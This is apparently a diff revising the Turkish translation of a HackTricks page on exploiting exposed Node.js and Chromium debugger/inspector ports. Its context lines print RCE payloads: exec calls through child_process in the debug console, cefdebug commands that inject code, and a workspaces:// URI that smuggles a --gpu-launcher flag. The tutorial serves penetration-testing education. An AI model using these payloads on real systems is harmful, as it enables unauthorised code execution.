@@ -19,10 +19,10 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" a
 
 [Belgelerden](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): `--inspect` anahtarı ile başlatıldığında, bir Node.js süreci bir hata ayıklama istemcisini dinler. **Varsayılan olarak**, **`127.0.0.1:9229`** adresinde dinleyecektir. Her sürece de **benzersiz** bir **UUID** atanır.
 
-İnspektör istemcileri, bağlanmak için host adresini, portu ve UUID'yi bilmek ve belirtmek zorundadır. Tam bir URL şu şekilde görünecektir: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.
+İnspektör istemcileri, bağlanmak için host adresini, portu ve UUID'yi bilmek ve belirtmek zorundadır. Tam bir URL şöyle görünecektir: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.
 
 {% hint style="warning" %}
-**Hata ayıklayıcı, Node.js yürütme ortamına tam erişime sahip olduğundan**, bu porta bağlanabilen kötü niyetli bir aktör, Node.js süreci adına rastgele kod çalıştırabilir (**potansiyel ayrıcalık yükseltme**).
+**Hata ayıklayıcı, Node.js yürütme ortamına tam erişime sahip olduğundan**, bu porta bağlanabilen kötü niyetli bir aktör, Node.js süreci adına rastgele kod çalıştırma yeteneğine sahip olabilir (**potansiyel ayrıcalık yükseltme**).
 {% endhint %}
 
 Bir inspektörü başlatmanın birkaç yolu vardır:
@@ -50,7 +50,7 @@ DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4
 ```
 ### Tarayıcılar, WebSocket'ler ve aynı köken politikası <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
 
-Bir web tarayıcısında açılan web siteleri, tarayıcı güvenlik modeli altında WebSocket ve HTTP istekleri yapabilir. **Benzersiz bir hata ayıklayıcı oturum kimliği elde etmek için** **ilk bir HTTP bağlantısı** gereklidir. **Aynı köken politikası**, web sitelerinin **bu HTTP bağlantısını** yapmasını **engeller**. [**DNS yeniden bağlama saldırılarına**](https://en.wikipedia.org/wiki/DNS\_rebinding)** karşı ek güvenlik için,** Node.js, bağlantı için **'Host' başlıklarının** ya bir **IP adresi** ya da **`localhost`** veya **`localhost6`** olarak tam olarak belirtildiğini doğrular.
+Bir web tarayıcısında açılan web siteleri, tarayıcı güvenlik modeli altında WebSocket ve HTTP istekleri yapabilir. **Benzersiz bir hata ayıklayıcı oturum kimliği** **edinmek için** **ilk bir HTTP bağlantısı** gereklidir. **Aynı köken politikası**, web sitelerinin **bu HTTP bağlantısını** yapmasını **engeller**. [**DNS yeniden bağlama saldırılarına**](https://en.wikipedia.org/wiki/DNS\_rebinding)** karşı ek güvenlik için,** Node.js, bağlantı için **'Host' başlıklarının** ya bir **IP adresi** ya da **`localhost`** veya **`localhost6`** olarak tam olarak belirtildiğini doğrular.
 
 {% hint style="info" %}
 Bu **güvenlik önlemleri, sadece bir HTTP isteği göndererek** kod çalıştırmak için **denetleyiciyi istismar etmeyi** engeller (bu, bir SSRF açığını istismar ederek yapılabilir).
@@ -58,29 +58,29 @@ Bu **güvenlik önlemleri, sadece bir HTTP isteği göndererek** kod çalıştı
 
 ### Çalışan süreçlerde denetleyiciyi başlatma
 
-Çalışan bir nodejs sürecine **SIGUSR1 sinyalini** göndererek, **denetleyiciyi** varsayılan portta **başlatmasını** sağlayabilirsiniz. Ancak, yeterli ayrıcalıklara sahip olmanız gerektiğini unutmayın, bu size **süreç içindeki bilgilere ayrıcalıklı erişim** sağlayabilir ama doğrudan bir ayrıcalık yükseltmesi sağlamaz.
+Çalışan bir nodejs sürecine **SIGUSR1 sinyalini** göndererek, **denetleyiciyi** varsayılan portta **başlatmasını** sağlayabilirsiniz. Ancak, yeterli ayrıcalıklara sahip olmanız gerektiğini unutmayın, bu nedenle bu, size **süreç içindeki bilgilere ayrıcalıklı erişim** sağlayabilir ama doğrudan bir ayrıcalık yükseltmesi sağlamaz.
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 ```
 {% hint style="info" %}
-Bu, **şu anda işlemi kapatıp yeni bir tane başlatmak** `--inspect` ile **bir seçenek olmadığı için** konteynerlerde faydalıdır çünkü **konteyner**, işlemle birlikte **öldürülecektir**.
+Bu, konteynerlerde faydalıdır çünkü **süreci kapatıp yeni bir tane başlatmak** `--inspect` ile **bir seçenek değildir** çünkü **konteyner** sürekle birlikte **öldürülecektir**.
 {% endhint %}
 
-### Denetleyici/hata ayıklayıcıya bağlanın
+### Denetleyici/hata ayıklayıcıya bağlan
 
-**Chromium tabanlı bir tarayıcıya** bağlanmak için, Chrome veya Edge için sırasıyla `chrome://inspect` veya `edge://inspect` URL'leri erişilebilir. Yapılandırma düğmesine tıklanarak, **hedef ana bilgisayar ve portun** doğru bir şekilde listelendiğinden emin olunmalıdır. Görüntü, Uzaktan Kod Yürütme (RCE) örneğini göstermektedir:
+**Chromium tabanlı bir tarayıcıya** bağlanmak için, Chrome veya Edge için sırasıyla `chrome://inspect` veya `edge://inspect` URL'leri erişilebilir. Yapılandırma düğmesine tıklanarak **hedef ana bilgisayar ve port** bilgilerin doğru listelendiğinden emin olunmalıdır. Görüntü, Uzaktan Kod Yürütme (RCE) örneğini göstermektedir:
 
 ![](<../../.gitbook/assets/image (674).png>)
 
-**Komut satırını** kullanarak bir hata ayıklayıcıya/denetleyiciye şu şekilde bağlanabilirsiniz:
+**Komut satırı** kullanarak bir hata ayıklayıcıya/denetleyiciye şu şekilde bağlanabilirsiniz:
 ```bash
 node inspect <ip>:<port>
 node inspect 127.0.0.1:9229
 # RCE example from debug console
 debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
 ```
-Araç [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), yerel olarak çalışan **denetleyicileri bulmayı** ve onlara **kod enjekte etmeyi** sağlar.
+Aracın [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), yerel olarak çalışan **denetleyicileri bulmayı** ve onlara **kod enjekte etmeyi** sağlar.
 ```bash
 #List possible vulnerable sockets
 ./cefdebug.exe
@@ -90,7 +90,7 @@ Araç [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebu
 ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
 ```
 {% hint style="info" %}
-Not edin ki **NodeJS RCE istismarları** [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) üzerinden bir tarayıcıya bağlı olduğunda çalışmayacaktır (onunla yapacak ilginç şeyler bulmak için API'yi kontrol etmeniz gerekir).
+Not edin ki **NodeJS RCE istismarları** [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) üzerinden bir tarayıcıya bağlı olduğunda **çalışmayacaktır** (bununla ilgili ilginç şeyler bulmak için API'yi kontrol etmeniz gerekir).
 {% endhint %}
 
 ## NodeJS Hata Ayıklayıcı/Denetleyici'de RCE
@@ -99,7 +99,7 @@ Not edin ki **NodeJS RCE istismarları** [**Chrome DevTools Protocol**](https://
 Eğer buraya [**Electron'da bir XSS'den RCE nasıl alınır**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/) diye bakmak için geldiyseniz, lütfen bu sayfayı kontrol edin.
 {% endhint %}
 
-Node **denetleyici**'ye **bağlandığınızda** **RCE** elde etmenin bazı yaygın yolları, (bu **Chrome DevTools protokolüne bağlantıda çalışmayacak gibi görünüyor**) bir şey kullanmaktır:
+Node **denetleyici**'ye **bağlandığınızda** **RCE** elde etmenin bazı yaygın yolları, (bu **Chrome DevTools protokolüne bağlantıda çalışmayacak gibi görünüyor**):
 ```javascript
 process.mainModule.require('child_process').exec('calc')
 window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
@@ -115,13 +115,13 @@ Bu bölümde, bu protokolü istismar etmek için insanların kullandığı ilgin
 
 [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino güvenliği, CEF tabanlı bir uygulamanın sistemde **özel bir URI** (workspaces://) kaydettiğini ve tam URI'yi aldığı ve ardından bu URI'den kısmen yapılandırılan bir konfigürasyonla **CEF tabanlı uygulamayı başlattığını** keşfetti.
 
-URI parametrelerinin URL kodlaması yapılarak CEF temel uygulamasını başlatmak için kullanıldığı, bir kullanıcının **komut satırında** **`--gpu-launcher`** bayrağını **enjekte etmesine** ve rastgele şeyler çalıştırmasına olanak tanıdığı keşfedildi.
+URI parametrelerinin URL çözümlemesi yapıldığı ve CEF temel uygulamasını başlatmak için kullanıldığı, kullanıcının **`--gpu-launcher`** bayrağını **komut satırına** enjekte etmesine ve rastgele şeyler çalıştırmasına olanak tanıdığı keşfedildi.
 
 Yani, şöyle bir yük:
 ```
 workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
 ```
-calc.exe'yi çalıştıracak.
+Will execute a calc.exe.
 
 ### Dosyaları Üzerine Yaz
 
@@ -163,8 +163,8 @@ Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
 * [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
 
 {% hint style="success" %}
-AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Ekip Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Ekip Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
